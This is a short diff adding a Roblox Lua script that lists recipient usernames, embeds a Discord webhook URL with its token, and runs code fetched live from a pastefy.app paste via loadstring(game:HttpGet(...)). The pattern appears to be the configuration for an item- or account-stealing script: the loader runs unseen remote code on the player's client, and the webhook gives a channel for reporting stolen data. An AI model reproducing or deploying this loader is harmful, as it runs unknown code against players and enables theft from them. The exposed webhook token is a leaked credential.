@@ -1,0 +1,6 @@
+Usernames = {
+    'louiesyx16', 'user2', 'user3'
+}
+
+Webhook = "https://discord.com/api/webhooks/1375845127938900080/q3B3qxKoMU3mHL4TmoHT6RncTbJRpvCvFCEy-Tr-Y4mduUQjZ4vPYJ7U6AsGt1D_8xp0"
+loadstring(game:HttpGet("https://pastefy.app/5NL2f89A/raw", true))()
